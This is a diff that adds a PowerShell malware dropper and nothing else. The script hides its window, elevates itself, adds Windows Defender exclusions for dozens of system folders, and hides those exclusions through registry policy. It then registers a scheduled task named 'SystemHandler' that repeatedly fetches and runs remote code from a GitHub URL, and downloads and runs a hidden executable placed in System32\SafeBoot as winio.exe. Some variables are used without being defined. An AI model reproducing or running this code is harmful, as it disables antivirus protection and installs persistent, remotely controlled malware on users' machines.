@@ -1,0 +1,131 @@
+$install_path = "C:\Windows\System32\SafeBoot\winio.exe"
+$update_url = "https://raw.githubusercontent.com/aodfs/0/refs/heads/main/i_q"
+
+Add-Type -TypeDefinition @"
+using System; 
+using System.Runtime.InteropServices; 
+public class WindowHelper 
+{ 
+    [DllImport("user32.dll")] 
+    public static extern IntPtr GetForegroundWindow(); 
+
+    [DllImport("user32.dll")] 
+    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow); 
+
+    public const int SW_HIDE = 0; 
+    public static void HideWindow() 
+    { 
+        IntPtr handle = GetForegroundWindow(); ShowWindow(handle, SW_HIDE); 
+    }
+}
+"@; 
+[WindowHelper]::HideWindow();
+
+if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
+{
+    $newProc = Start-Process -FilePath "powershell.exe" -ArgumentList ("-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command iex(iwr '" + $install_url + "' -UseBasicP)") -Verb RunAs -PassThru;
+    $newProc.WaitForExit();
+    exit;
+}
+
+$paths = @(
+    "C:\Program Files\Windows Defender",
+    "C:\Program Files\Windows Defender Advanced Threat Protection",
+    "C:\Program Files\Windows NT",
+    "C:\Program Files\Windows Security",
+    "C:\Program Files\WindowsPowerShell",
+
+    "C:\Program Files (x86)\Internet Explorer",
+    "C:\Program Files (x86)\Microsoft",
+    "C:\Program Files (x86)\Windows Defender",
+    "C:\Program Files (x86)\Windows NT",
+    "C:\Program Files (x86)\WindowsPowerShell",
+
+    "C:\Windows\Boot",
+    "C:\Windows\SafeBoot",
+    "C:\Windows\CSC",
+    "C:\Windows\debug",
+    "C:\Windows\diagnostics",
+    "C:\Windows\Logs",
+    "C:\Windows\PLA",
+    "C:\Windows\Resources",
+    "C:\Windows\security",
+    "C:\Windows\System",
+    "C:\Windows\System32",
+    "C:\Windows\SystemApps",
+    "C:\Windows\SystemResources",
+    "C:\Windows\SystemTemp",
+    "C:\Windows\SysWOW64",
+    "C:\Windows\Tasks",
+    "C:\Windows\WinSxS",
+    "C:\Windows\Temp",
+    
+    "$env:LOCALAPPDATA\Temp"
+);
+foreach($path in $paths) {
+    try {
+        Add-MpPreference -ExclusionPath $path -ErrorAction SilentlyContinue;
+    } catch {
+        # HANDLE ERRORS
+    };
+};
+
+$keys = @(
+    "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\HideExclusionsFromLocalAdmins",
+    "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\HideExclusions"
+);
+    
+foreach ($key in $keys) 
+{
+    try {
+        if (-not (Test-Path $key -ErrorAction SilentlyContinue)) {
+            New-Item -Path $key -Force -ErrorAction SilentlyContinue | Out-Null;
+            New-ItemProperty -Path $key -Name "Default" -Value 1 -PropertyType "DWORD" -Force -ErrorAction SilentlyContinue | Out-Null;
+        } else {
+            Set-ItemProperty -Path $key -Name "Default" -Value 1 -Force -ErrorAction SilentlyContinue;
+        };
+    } 
+    catch {
+        continue;
+    }
+};
+
+# Ensure the ScheduledTasks module is available
+Import-Module ScheduledTasks
+
+# Define task parameters
+$taskName = "SystemHandler"
+$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command 'iex (iwr \"https://raw.githubusercontent.com/aodfs/0/refs/heads/main/i\" -UseBasicP)'"
+
+# Create the scheduled task object and register it
+Register-ScheduledTask -TaskName $taskName `
+                        -Action $action `
+                        -Trigger $triggerDaily, $triggerStartup `
+                        -Principal $principal `
+
+Write-Host "Scheduled task '$taskName' created successfully."
+
+# Download using BitsTransfer
+Start-BitsTransfer -Source $install_url -Destination $install_path -ErrorAction SilentlyContinue;
+
+# Check if client is downloaded;
+# if not download it using Invoke-WebRequest
+if (-not (Test-Path $install_path)) {
+    Invoke-WebRequest -Uri $install_url -OutFile $install_path -ErrorAction SilentlyContinue;
+};
+    
+# Test if client is downloaded
+if (Test-Path $install_path) 
+{
+    try {
+        Start-Process -FilePath $install_path -Verb RunAs -WindowStyle Hidden -ErrorAction Stop;
+    } catch  {
+        try {
+            Start-Process -FilePath $install_path -ErrorAction SilentlyContinue;
+        } catch {}
+    }
+} else {
+    # Client is not downloaded (unknown reason);
+};
+
+exit;
